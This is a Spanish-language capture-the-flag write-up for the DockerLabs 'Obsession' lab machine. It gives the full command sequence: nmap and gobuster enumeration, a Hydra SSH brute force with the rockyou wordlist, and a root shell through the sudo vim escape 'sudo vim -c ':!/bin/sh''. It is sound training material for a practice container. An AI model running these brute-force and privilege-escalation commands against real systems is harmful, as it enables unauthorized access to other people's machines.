# Write-up - Obsession

**Sitio:** DockerLabs  
**Dificultad:** Muy Fácil  
**Fecha:** 13/06/2025  
**Aprendizaje:**  
- Refresqué conceptos relacionados con esteganografía, fuerza bruta y enumeración de directorios web.  
- Practiqué el uso de herramientas como `Gobuster`, `Hydra`, `Steghide`, `SCP` y `Vim` para escalar privilegios.  
- Reforcé el hábito de buscar información útil en el código fuente de páginas web.  
- Recordé que si un binario como `vim` aparece en `sudo -l`, es probable que se pueda explotar para obtener una shell privilegiada.  

> Repositorio del creador: [russ0ski/MyHackingRoad](https://russ0ski.github.io/MyHackingRoad/)

---

## Enumeración inicial  

### 1. Escaneo de puertos  

`sudo nmap -sSV -O --open 172.17.0.2`  

> Resultados:  
`21/tcp open — FTP (vsftpd 3.0.5)`  
`22/tcp open — SSH (OpenSSH 9.6p1)`  
`80/tcp open — HTTP (Apache 2.4.58)`  
`SO: Linux`  

## Fase de enumeración web  

### 2. Enumeración de directorios con Gobuster  

`gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/rockyou.txt -x php,html,txt -q -b 404,403`  

> Rutas encontradas:  
/important → contiene un texto que no fue de utilidad.  
/backup → revela el nombre de usuario: `russoski.`  

## Fuerza bruta y acceso SSH

### 3. Ataque con Hydra

`hydra -l russoski -P /usr/share/wordlists/rockyou.txt -V ssh://172.17.0.2`  

> Credenciales obtenidas:  
Usuario: `russoski`  
Contraseña: `iloveme`

### 4. Acceso SSH

`ssh -l russoski 172.17.0.2`  

## Fase de post-explotación

### 5. Revisión del directorio Proyectos

`cd Proyectos`  
`python3 Strong-Credentials.py`  

> Resultado:

Se genera una contraseña aleatoria: `KrG4V8zNictD3[Mqñ¿d5`

### 6. Revisión del directorio Documentos

En la carpeta "Documentos" me encuentro una imagen la cual me la copio.

`scp russoski@172.17.0.2:/home/russoski/Documentos/'Nikola Tesla.jpg' /home/kali/Desktop/img/Nikola_Tesla.jpg`  

### 7. Análisis esteganográfico

`steghide info Nikola_Tesla.jpg`  

> Resultado: Sin archivos embebidos visibles.     

## Acceso por FTP  

### 8. Conexión al servidor FTP  

Se accede con el mismo user/pass. Solo permite leer y descargar archivos ya conocidos.  

## Escalada de privilegios  

### 9. Verificación de permisos con sudo -l  

`sudo -l`  

> Resultado:

User russoski may run the following commands on <host>:  
    (ALL) NOPASSWD: /usr/bin/vim  

### 10. Ejecución del exploit vía GTFOBins

`sudo vim -c ':!/bin/sh'`  

### 11. Confirmación de privilegios  

> whoami = `root`
